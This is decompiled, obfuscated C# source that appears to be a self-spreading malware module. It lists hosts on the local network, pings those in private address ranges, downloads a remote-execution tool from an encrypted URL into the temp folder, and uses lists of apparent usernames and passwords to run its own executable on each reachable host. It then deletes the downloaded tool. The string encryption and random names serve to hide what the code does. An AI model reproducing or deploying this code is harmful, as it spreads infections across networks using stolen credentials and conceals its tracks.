using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace qYAjLWajCJpnf;

internal sealed class TaboJirPIvtr
{
	private sealed class BtMEEwwBtLz
	{
		public string UZokWbXhxaGNDr;

		public string FQwmqyTwZN;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107377914)) && !string_0.StartsWith(getString_0(107377909)) && !string_0.StartsWith(getString_0(107377868)) && !string_0.Contains(getString_0(107377887))) || !yThKTqJWNfEEXwD(string_0))
			{
				return;
			}
			if (bTJSgdVkQM.FtfEHcuGYoigQT == getString_0(107396975))
			{
				for (int i = 0; i < UnGdqvmVPIRw.Count; i++)
				{
					if (bTJSgdVkQM.ZDbHiLoVEkHSf)
					{
						if (File.Exists(UZokWbXhxaGNDr))
						{
							bTJSgdVkQM.sroZTJGCRhFP(UZokWbXhxaGNDr, getString_0(107348845) + string_0 + getString_0(107459642) + UnGdqvmVPIRw[i] + getString_0(107459633) + gJavkmIzpcRQ[i] + getString_0(107459592) + Assembly.GetEntryAssembly()!.Location + getString_0(107348863));
						}
					}
					else if (File.Exists(FQwmqyTwZN))
					{
						bTJSgdVkQM.sroZTJGCRhFP(FQwmqyTwZN, getString_0(107348845) + string_0 + getString_0(107459642) + UnGdqvmVPIRw[i] + getString_0(107459633) + gJavkmIzpcRQ[i] + getString_0(107459559) + Assembly.GetEntryAssembly()!.Location + getString_0(107348863));
					}
				}
			}
			else if (bTJSgdVkQM.ZDbHiLoVEkHSf)
			{
				if (File.Exists(UZokWbXhxaGNDr))
				{
					bTJSgdVkQM.sroZTJGCRhFP(UZokWbXhxaGNDr, getString_0(107348845) + string_0 + getString_0(107459502) + Assembly.GetEntryAssembly()!.Location + getString_0(107348863));
				}
			}
			else if (File.Exists(FQwmqyTwZN))
			{
				bTJSgdVkQM.sroZTJGCRhFP(FQwmqyTwZN, getString_0(107348845) + string_0 + getString_0(107458957) + Assembly.GetEntryAssembly()!.Location + getString_0(107348863));
			}
		}

		static BtMEEwwBtLz()
		{
			Strings.CreateGetStringDelegate(typeof(BtMEEwwBtLz));
		}
	}

	public static List<string> btMtYLfqEoNw;

	public static string NGtRmYhZiJq;

	public static List<string> UnGdqvmVPIRw;

	public static List<string> gJavkmIzpcRQ;

	public static List<string> izLQJUNlsoC;

	public List<string> fzYBHyuzVxhJ = new List<string>();

	public List<string> rklOCXcKUKGBO = new List<string>();

	public List<string> WaAwWUJVVqrVCj = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void IetYuyAZDkh()
	{
		BtMEEwwBtLz CS_0024_003C_003E8__locals0 = new BtMEEwwBtLz();
		bTJSgdVkQM.OuwslfEqACx();
		List<TxBKgQVchDeTS> list = TxBKgQVchDeTS.QnpHqmCNtB();
		foreach (TxBKgQVchDeTS item in list)
		{
			btMtYLfqEoNw.Add(item.IPAddress);
		}
		if (bTJSgdVkQM.qvPWtnGDFercawvHYD.Count > 0)
		{
			btMtYLfqEoNw = btMtYLfqEoNw.Union(bTJSgdVkQM.qvPWtnGDFercawvHYD).ToList();
		}
		CS_0024_003C_003E8__locals0.UZokWbXhxaGNDr = getString_0(107350580);
		CS_0024_003C_003E8__locals0.FQwmqyTwZN = getString_0(107350580);
		try
		{
			CS_0024_003C_003E8__locals0.UZokWbXhxaGNDr = axWXvwdAJqejX();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.FQwmqyTwZN = SbDGbksWSiAW();
		}
		catch
		{
		}
		foreach (TxBKgQVchDeTS item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107377911)) || item2.IPAddress.StartsWith(getString_0(107377906)) || item2.IPAddress.StartsWith(getString_0(107377865)) || item2.IPAddress.Contains(getString_0(107377884)))
				{
					UgWbNbXiAr.DFKdxLDXAiHMP(item2.MacAddress, item2.IPAddress, getString_0(107459361));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(btMtYLfqEoNw, delegate(string string_0)
			{
				if ((string_0.StartsWith(BtMEEwwBtLz.getString_0(107377914)) || string_0.StartsWith(BtMEEwwBtLz.getString_0(107377909)) || string_0.StartsWith(BtMEEwwBtLz.getString_0(107377868)) || string_0.Contains(BtMEEwwBtLz.getString_0(107377887))) && yThKTqJWNfEEXwD(string_0))
				{
					if (bTJSgdVkQM.FtfEHcuGYoigQT == BtMEEwwBtLz.getString_0(107396975))
					{
						for (int i = 0; i < UnGdqvmVPIRw.Count; i++)
						{
							if (bTJSgdVkQM.ZDbHiLoVEkHSf)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.UZokWbXhxaGNDr))
								{
									bTJSgdVkQM.sroZTJGCRhFP(CS_0024_003C_003E8__locals0.UZokWbXhxaGNDr, BtMEEwwBtLz.getString_0(107348845) + string_0 + BtMEEwwBtLz.getString_0(107459642) + UnGdqvmVPIRw[i] + BtMEEwwBtLz.getString_0(107459633) + gJavkmIzpcRQ[i] + BtMEEwwBtLz.getString_0(107459592) + Assembly.GetEntryAssembly()!.Location + BtMEEwwBtLz.getString_0(107348863));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.FQwmqyTwZN))
							{
								bTJSgdVkQM.sroZTJGCRhFP(CS_0024_003C_003E8__locals0.FQwmqyTwZN, BtMEEwwBtLz.getString_0(107348845) + string_0 + BtMEEwwBtLz.getString_0(107459642) + UnGdqvmVPIRw[i] + BtMEEwwBtLz.getString_0(107459633) + gJavkmIzpcRQ[i] + BtMEEwwBtLz.getString_0(107459559) + Assembly.GetEntryAssembly()!.Location + BtMEEwwBtLz.getString_0(107348863));
							}
						}
					}
					else if (bTJSgdVkQM.ZDbHiLoVEkHSf)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.UZokWbXhxaGNDr))
						{
							bTJSgdVkQM.sroZTJGCRhFP(CS_0024_003C_003E8__locals0.UZokWbXhxaGNDr, BtMEEwwBtLz.getString_0(107348845) + string_0 + BtMEEwwBtLz.getString_0(107459502) + Assembly.GetEntryAssembly()!.Location + BtMEEwwBtLz.getString_0(107348863));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.FQwmqyTwZN))
					{
						bTJSgdVkQM.sroZTJGCRhFP(CS_0024_003C_003E8__locals0.FQwmqyTwZN, BtMEEwwBtLz.getString_0(107348845) + string_0 + BtMEEwwBtLz.getString_0(107458957) + Assembly.GetEntryAssembly()!.Location + BtMEEwwBtLz.getString_0(107348863));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.UZokWbXhxaGNDr))
			{
				File.Delete(CS_0024_003C_003E8__locals0.UZokWbXhxaGNDr);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.FQwmqyTwZN))
			{
				File.Delete(CS_0024_003C_003E8__locals0.FQwmqyTwZN);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string axWXvwdAJqejX()
	{
		if (IntPtr.Size == 8)
		{
			return qQNHIfyNpMA(new Uri(bTJSgdVkQM.gvCYkntYkqMW(getString_0(107459340))));
		}
		return qQNHIfyNpMA(new Uri(bTJSgdVkQM.gvCYkntYkqMW(getString_0(107459340))));
	}

	public static string SbDGbksWSiAW()
	{
		if (IntPtr.Size == 8)
		{
			return qQNHIfyNpMA(new Uri(bTJSgdVkQM.gvCYkntYkqMW(getString_0(107459291))));
		}
		return qQNHIfyNpMA(new Uri(bTJSgdVkQM.gvCYkntYkqMW(getString_0(107459726))));
	}

	public static bool yThKTqJWNfEEXwD(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string qQNHIfyNpMA(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107459621), getString_0(107350580)).Remove(0, 3) + getString_0(107459616);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static TaboJirPIvtr()
	{
		Strings.CreateGetStringDelegate(typeof(TaboJirPIvtr));
		btMtYLfqEoNw = new List<string>();
		NGtRmYhZiJq = getString_0(107350580);
		UnGdqvmVPIRw = new List<string>();
		gJavkmIzpcRQ = new List<string>();
		izLQJUNlsoC = new List<string>();
	}
}
